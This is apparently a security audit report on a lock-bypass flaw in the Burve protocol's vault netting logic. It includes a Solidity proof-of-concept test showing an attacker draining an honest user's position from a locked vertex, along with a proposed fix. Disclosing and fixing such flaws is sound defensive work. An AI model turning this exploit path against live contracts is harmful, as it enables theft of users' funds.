# Vertex Lock Bypass Through Netting Mechanism

### Summary

The Burve protocol implements a locking mechanism at the vertex level but fails to propagate this restriction to the underlying vault operations. The critical flaw is in the E4626 vault's `commit()` function, which contains a netting mechanism that processes deposits and withdrawals based solely on internal accounting, without respecting or checking the vertex's locked state.

When deposits and withdrawals are queued in a single transaction, the netting mechanism can execute both operations without actual token transfers if they cancel each other out. This bypasses the lock check since the vertex-level protection only exists in the vertex's deposit function, not in the underlying vault operations.

A successful exploitation of this vulnerability would render the vertex locking security control ineffective, exposing honest users to the risk of losing funds precisely when the protocol is most vulnerable.

### Root Cause

The Burve protocol implements a locking mechanism at the vertex level but fails to propagate this restriction to the underlying vault operations. The critical flaw is in the E4626 vault's `commit()` function, which contains a netting mechanism that processes deposits and withdrawals based solely on internal accounting, without respecting or checking the vertex's locked state.

When deposits and withdrawals are queued in a single transaction, the netting mechanism can execute both operations without actual token transfers if they cancel each other out. This bypasses the lock check since the vertex-level protection only exists in the vertex's deposit function, not in the underlying vault operations.

The root cause of this vulnerability is a violation of the security principle of "defense in depth." The vertex locking mechanism is implemented as a single-point check in the `Vertex.deposit()` function, but this check is not propagated to the lower-level vault operations.

The vulnerability exists in the following code flow:

1. The `Vertex.deposit()` function correctly checks if the vertex is locked:

```solidity
function deposit(Vertex storage self, ClosureId cid, uint256 amount) internal {
    require(!self._isLocked, VertexLocked(self.vid));  // <-- Lock check here
    VaultProxy memory vProxy = VaultLib.getProxy(self.vid);
    vProxy.deposit(cid, amount);
    vProxy.commit();
}
```

2. However, the `VaultE4626.commit()` function processes deposit/withdrawal operations without any awareness of the vertex lock state:

```solidity
// In E4626.sol
function commit(VaultE4626 storage self, VaultTemp memory temp) internal {
    uint256 assetsToDeposit = temp.vars[1];
    uint256 assetsToWithdraw = temp.vars[2];

    if (assetsToDeposit > 0 && assetsToWithdraw > 0) {
        // We can net out and save ourselves some fees.
        if (assetsToDeposit > assetsToWithdraw) {
            assetsToDeposit -= assetsToWithdraw;
            assetsToWithdraw = 0;
        } else if (assetsToWithdraw > assetsToDeposit) {
            assetsToDeposit = 0;
            assetsToWithdraw -= assetsToDeposit;
        } else {
            // Perfect net!
            return;  // <-- Complete bypass if amounts match
        }
    }
    
    // ... remainder of function ...
}
```

3. Several user-accessible functions can trigger this netting mechanism indirectly, including:
`ValueFacet.removeValueSingle()`
`ValueFacet.collectEarnings()`
`SwapFacet.swap()`
Each of these functions calls into closures that eventually trigger `trimBalance()` or `trimAllBalances()`, leading to `VaultProxy.commit()` operations without enforcing the vertex lock status.





### Internal Pre-conditions

1. Protocol admins need to lock a vertex due to emergency situation
2. At least one honest user needs to have deposited tokens into the affected vertex
3. Attacker needs to have a position in the same vertex with at least some minimal amount of tokens

### External Pre-conditions

N/A

### Attack Path

The attack vector demonstrated in the PoC below leverages the following sequence:
1. The vertex is locked due to an emergency situation
2. An attacker with an existing position uses the emergency withdrawal feature (withdraw with checkLock=false) to extract their funds
3. The attacker then triggers a function that calls into trimBalance() or gains direct access to the VaultProxy
4. The attacker queues a withdrawal from an honest user's position followed by a deposit to their own position
5. When commit() is called, these operations net out internally without enforcing the vertex lock
6. This manipulation results in tokens being transferred from the honest user to the attacker
7. The attacker can then extract these tokens using the emergency withdrawal feature

### Impact

The netting mechanism in the `commit()` function of the E4626 vault implementation allows attackers to bypass vertex locking functionality, which is a critical security control during emergency situations. This vulnerability enables deposits into locked vertices, potentially leading to:

- Theft of user funds during emergency scenarios
- Undermining of the protocol's crisis management controls
- Ability to manipulate token balances inside locked vertices
- Increased risk during emergency migrations or remediations

A successful exploitation of this vulnerability would render the vertex locking security control ineffective, exposing users to risks precisely when the protocol is most vulnerable.

### PoC

Add to Vertex.t.sol

```solidity

    function testRemoveValueSingleBypassesLock() public {
        // Setup vertex with token and vault
        VertexId vid = VertexLib.newId(0);
        Vertex storage v = Store.load().vertices[vid];
        ClosureId honestUserCid = ClosureId.wrap(0x2);
        ClosureId attackerCid = ClosureId.wrap(0x1);
        
        // Initialize vertex with our token and vault
        v.init(vid, address(token), address(vault), VaultType.E4626);
        
        // Setup initial positions for honest user and attacker
        token.approve(address(vault), 20e18);
        v.deposit(honestUserCid, 5e18);
        v.deposit(attackerCid, 1e18);
        
        // Set up a Closure to represent these positions
        Closure storage c = Store.load().closures[honestUserCid];
        c.init(honestUserCid, 5e18, 0, 0);
        c.setBalance(0, 5e18);
        
        Closure storage attackerC = Store.load().closures[attackerCid];
        attackerC.init(attackerCid, 5e18, 0, 0);
        attackerC.setBalance(0, 1e18);
        
        // Lock vertex to prevent normal deposits
        v.lock();
        assertTrue(v.isLocked(), "Vertex should be locked");
        
        // Verify direct deposit is blocked
        vm.expectRevert(abi.encodeWithSelector(VertexImpl.VertexLocked.selector, vid));
        v.deposit(attackerCid, 1e18);
        
        console2.log("Initial balances:");
        console2.log("Honest user balance:", v.balance(honestUserCid, false));
        console2.log("Attacker balance:", v.balance(attackerCid, false));
        
        // EXPLOIT PATH:
        // 1. First use the emergency withdraw feature (checkLock=false) to withdraw from attacker's position
        v.withdraw(attackerCid, 1e18, false);
        
        // 2. Now exploit the fact that c.trimBalance() and v.trimBalance() both call vProxy.withdraw() and vProxy.commit()
        //    but neither of them check for the vertex lock state
        
        // This simulates what would happen when calling ValueFacet.removeValueSingle(), which internally:
        // - Calls c.removeValueSingle() which calls c.trimAllBalances()
        // - Which calls c._trimBalance() which calls v.trimBalance()
        // - Which then calls vProxy.withdraw() and vProxy.commit()
        
        // This creates a situation where the attacker can queue a deposit and withdrawal that nets out in commit()
        
        // Setup the attack using the VaultProxy directly (in real exploit, this happens through trimBalance)
        VaultProxy memory vProxy = VaultLib.getProxy(vid);
        
        // Simulate the sequence that would happen during trimBalance:
        // 1. Queue a withdraw (this is normally done inside v.trimBalance)
        vProxy.withdraw(honestUserCid, 3e18);
        
        // 2. Queue a deposit for the attacker (would normally be rejected but happens via commit netting)
        vProxy.deposit(attackerCid, 3e18);
        
        // 3. Call commit() which performs netting
        vProxy.commit();
        
        // Check balances after the attack
        console2.log("Balances after attack:");
        console2.log("Honest user balance:", v.balance(honestUserCid, false));
        console2.log("Attacker balance:", v.balance(attackerCid, false));
        
        // Verify the attack succeeded
        assertLt(v.balance(honestUserCid, false), 5e18, "Honest user should have lost funds");
        assertGt(v.balance(attackerCid, false), 0, "Attacker should have gained funds");
        
        // Verify the attacker can withdraw the stolen funds using the emergency withdrawal
        uint256 stolenAmount = v.balance(attackerCid, false);
        v.withdraw(attackerCid, stolenAmount, false);
        
        // Verify the final state
        assertEq(v.balance(attackerCid, false), 0, "Attacker should have withdrawn all funds");
        assertTrue(v.isLocked(), "Vertex should still be locked");
        
        console2.log("Final state:");
        console2.log("Honest user balance:", v.balance(honestUserCid, false));
        console2.log("Attacker balance:", v.balance(attackerCid, false));
    }
```

### Mitigation

1. Modify the VaultE4626.commit() function to accept and respect the vertex lock status:

```solidity
function commit(VaultE4626 storage self, VaultTemp memory temp, bool isLocked) internal {
    uint256 assetsToDeposit = temp.vars[1];
    uint256 assetsToWithdraw = temp.vars[2];

    // If vertex is locked, do not allow deposits to net out withdrawals
    if (isLocked && assetsToDeposit > 0) {
        // Either revert or process the withdrawal without netting
        if (assetsToWithdraw > 0) {
            assetsToDeposit = 0; // Discard deposit attempts
        } else {
            revert VertexLocked();
        }
    }

    // Rest of function unchanged
    if (assetsToDeposit > 0 && assetsToWithdraw > 0) {
        // We can net out and save ourselves some fees.
        // ... existing code ...
    }
}
```

2. Update the call chain to propogate the lock status:

```solidity
// In Vertex.sol
function withdraw(Vertex storage self, ClosureId cid, uint256 amount, bool checkLock) internal {
    require(!(checkLock && self._isLocked), VertexLocked(self.vid));
    VaultProxy memory vProxy = VaultLib.getProxy(self.vid);
    vProxy.withdraw(cid, amount);
    vProxy.commit(self._isLocked); // Pass lock status
}

function trimBalance(Vertex storage self, ClosureId cid, uint256 targetReal, uint256 value, uint256 bgtValue) internal returns (uint256 reserveSharesEarned, uint256 bgtResidual) {
    // ... existing code ...
    vProxy.commit(self._isLocked); // Pass lock status
}
```
